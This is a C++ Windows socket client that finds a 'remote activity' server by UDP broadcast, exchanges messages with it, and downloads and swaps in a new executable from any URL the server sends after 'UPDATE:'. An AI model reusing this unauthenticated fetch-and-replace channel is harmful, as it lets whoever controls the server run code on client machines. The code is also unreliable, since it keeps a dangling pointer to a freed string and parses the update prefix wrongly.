#include "network_client.h"
#include "system_info.h"
#include <iostream>
#include <chrono>
#include <thread>
#include <algorithm>
#include <ws2tcpip.h>

NetworkClient::NetworkClient(const char* ip, int port) 
    : sock(INVALID_SOCKET), discoverySocket(INVALID_SOCKET), server_ip((char*)ip), server_port(port), 
      isRunning(true), reconnectDelay(5000), discoveryMode(false) {
}

NetworkClient::~NetworkClient() {
    disconnect();
    cleanupDiscoverySocket();
    WSACleanup();
}

bool NetworkClient::initialize() {
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        std::cerr << "ERROR: WSAStartup failed" << std::endl;
        return false;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(server_port);
    server.sin_addr.s_addr = inet_addr(server_ip);

    return true;
}

bool NetworkClient::connectToServer() {
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        std::cerr << "ERROR: Socket creation failed" << std::endl;
        return false;
    }

    std::cout << "Attempting to connect to " << server_ip << ":" << server_port << "..." << std::endl;

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
        std::cerr << "ERROR: Connection failed - server may be down" << std::endl;
        closesocket(sock);
        sock = INVALID_SOCKET;
        return false;
    }

    std::cout << "Connected successfully!" << std::endl;
    return true;
}

void NetworkClient::sendMessage(const char* message) {
    if (sock == INVALID_SOCKET) return;

    if (send(sock, message, strlen(message), 0) == SOCKET_ERROR) {
        std::cerr << "ERROR: Failed to send message" << std::endl;
        closesocket(sock);
        sock = INVALID_SOCKET;
    } else {
        std::cout << "Message sent: " << message << std::endl;
    }
}

void NetworkClient::receiveResponse() {
    if (sock == INVALID_SOCKET) return;

    char buffer[1024];
    int len = recv(sock, buffer, sizeof(buffer) - 1, 0);
    
    if (len > 0) {
        buffer[len] = 0;
        std::cout << "Server response: " << buffer << std::endl;
    } else if (len == 0) {
        std::cout << "Server closed connection" << std::endl;
        closesocket(sock);
        sock = INVALID_SOCKET;
    } else {
        std::cerr << "ERROR: Failed to receive response" << std::endl;
        closesocket(sock);
        sock = INVALID_SOCKET;
    }
}

void NetworkClient::disconnect() {
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
        sock = INVALID_SOCKET;
    }
}

bool NetworkClient::isConnected() const {
    return sock != INVALID_SOCKET;
}

void NetworkClient::setReconnectDelay(int delay) {
    reconnectDelay = delay;
}

// Server discovery methods
bool NetworkClient::discoverServers(int timeoutSeconds) {
    std::cout << "Starting server discovery..." << std::endl;
    discoveredServers.clear();
    
    if (!initializeDiscoverySocket()) {
        std::cerr << "ERROR: Failed to initialize discovery socket" << std::endl;
        return false;
    }
    
    // Send discovery broadcast
    if (!sendDiscoveryBroadcast()) {
        std::cerr << "ERROR: Failed to send discovery broadcast" << std::endl;
        return false;
    }
    
    // Listen for server responses
    if (!listenForServerResponses(timeoutSeconds)) {
        std::cerr << "WARNING: No server responses received" << std::endl;
    }
    
    cleanupDiscoverySocket();
    
    if (discoveredServers.empty()) {
        std::cout << "No servers discovered. Trying fallback to localhost..." << std::endl;
        discoveredServers.push_back("127.0.0.1");
    }
    
    std::cout << "Discovered " << discoveredServers.size() << " server(s):" << std::endl;
    for (const auto& server : discoveredServers) {
        std::cout << "  - " << server << std::endl;
    }
    
    return !discoveredServers.empty();
}

std::string NetworkClient::findBestServer() {
    if (discoveredServers.empty()) {
        return "127.0.0.1"; // Fallback to localhost
    }
    
    // For now, just return the first discovered server
    // In a more sophisticated implementation, you could ping servers to find the best one
    return discoveredServers[0];
}

bool NetworkClient::connectToDiscoveredServer() {
    std::string bestServer = findBestServer();
    std::cout << "Connecting to discovered server: " << bestServer << std::endl;
    
    // Update server IP and reconnect
    server_ip = (char*)bestServer.c_str();
    server.sin_addr.s_addr = inet_addr(server_ip);
    
    return connectToServer();
}

void NetworkClient::setDiscoveryMode(bool enabled) {
    discoveryMode = enabled;
}

std::vector<std::string> NetworkClient::getDiscoveredServers() const {
    return discoveredServers;
}

// Private discovery methods
bool NetworkClient::initializeDiscoverySocket() {
    discoverySocket = socket(AF_INET, SOCK_DGRAM, 0);
    if (discoverySocket == INVALID_SOCKET) {
        std::cerr << "ERROR: Discovery socket creation failed" << std::endl;
        return false;
    }
    
    // Set socket options for broadcast
    int broadcast = 1;
    if (setsockopt(discoverySocket, SOL_SOCKET, SO_BROADCAST, 
                   (char*)&broadcast, sizeof(broadcast)) < 0) {
        std::cerr << "ERROR: Failed to set broadcast option" << std::endl;
        closesocket(discoverySocket);
        discoverySocket = INVALID_SOCKET;
        return false;
    }
    
    // Bind to any available port
    struct sockaddr_in bindAddr;
    bindAddr.sin_family = AF_INET;
    bindAddr.sin_port = htons(0); // Let system choose port
    bindAddr.sin_addr.s_addr = INADDR_ANY;
    
    if (bind(discoverySocket, (struct sockaddr*)&bindAddr, sizeof(bindAddr)) < 0) {
        std::cerr << "ERROR: Failed to bind discovery socket" << std::endl;
        closesocket(discoverySocket);
        discoverySocket = INVALID_SOCKET;
        return false;
    }
    
    return true;
}

void NetworkClient::cleanupDiscoverySocket() {
    if (discoverySocket != INVALID_SOCKET) {
        closesocket(discoverySocket);
        discoverySocket = INVALID_SOCKET;
    }
}

bool NetworkClient::sendDiscoveryBroadcast() {
    struct sockaddr_in broadcastAddr;
    broadcastAddr.sin_family = AF_INET;
    broadcastAddr.sin_port = htons(server_port);
    broadcastAddr.sin_addr.s_addr = INADDR_BROADCAST;
    
    const char* discoveryMessage = "REMOTE_ACTIVITY_DISCOVERY";
    int messageLen = strlen(discoveryMessage);
    
    if (sendto(discoverySocket, discoveryMessage, messageLen, 0,
               (struct sockaddr*)&broadcastAddr, sizeof(broadcastAddr)) < 0) {
        std::cerr << "ERROR: Failed to send discovery broadcast" << std::endl;
        return false;
    }
    
    std::cout << "Discovery broadcast sent" << std::endl;
    return true;
}

bool NetworkClient::listenForServerResponses(int timeoutSeconds) {
    fd_set readSet;
    struct timeval timeout;
    
    FD_ZERO(&readSet);
    FD_SET(discoverySocket, &readSet);
    
    timeout.tv_sec = timeoutSeconds;
    timeout.tv_usec = 0;
    
    char buffer[1024];
    struct sockaddr_in fromAddr;
    int fromAddrLen = sizeof(fromAddr);
    
    std::cout << "Listening for server responses..." << std::endl;
    
    while (true) {
        int result = select(0, &readSet, NULL, NULL, &timeout);
        
        if (result == 0) {
            std::cout << "Discovery timeout reached" << std::endl;
            break;
        } else if (result < 0) {
            std::cerr << "ERROR: Select failed during discovery" << std::endl;
            return false;
        }
        
        if (FD_ISSET(discoverySocket, &readSet)) {
            int len = recvfrom(discoverySocket, buffer, sizeof(buffer) - 1, 0,
                              (struct sockaddr*)&fromAddr, &fromAddrLen);
            
            if (len > 0) {
                buffer[len] = 0;
                std::string response(buffer);
                
                                    if (response.find("REMOTE_ACTIVITY_SERVER") != std::string::npos) {
                        char* serverIP = inet_ntoa(fromAddr.sin_addr);
                        if (serverIP != NULL) {
                            std::string serverAddress(serverIP);
                            if (std::find(discoveredServers.begin(), discoveredServers.end(), 
                                         serverAddress) == discoveredServers.end()) {
                                discoveredServers.push_back(serverAddress);
                                std::cout << "Discovered server: " << serverAddress << std::endl;
                            }
                        }
                    }
            }
        }
        
        // Reset timeout for next iteration
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        FD_ZERO(&readSet);
        FD_SET(discoverySocket, &readSet);
    }
    
    return true;
}

std::string NetworkClient::getLocalIP() {
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        return "127.0.0.1";
    }
    
    struct hostent* host = gethostbyname(hostname);
    if (host == NULL || host->h_addr_list[0] == NULL) {
        return "127.0.0.1";
    }
    
    char* localIP = inet_ntoa(*(struct in_addr*)host->h_addr_list[0]);
    return std::string(localIP);
}

bool NetworkClient::handleUpdateCommand(const std::string& command) {
    if (command.find("UPDATE:") != std::string::npos) {
        std::string updateUrl = command.substr(7); // Skip "UPDATE:"
        return downloadUpdate(updateUrl);
    }
    return false;
}

bool NetworkClient::downloadUpdate(const std::string& updateUrl) {
    try {
        std::cout << "Downloading update from: " << updateUrl << std::endl;
        
        // Use SystemInfo to handle the download
        return SystemInfo::downloadAndUpdate(updateUrl);
    }
    catch (const std::exception& e) {
        std::cerr << "Error downloading update: " << e.what() << std::endl;
        return false;
    }
}

void NetworkClient::performSelfUpdate(const std::string& newExePath) {
    // This method is called by SystemInfo::downloadAndUpdate
    // The actual update process is handled there
    std::cout << "Self-update process initiated" << std::endl;
} 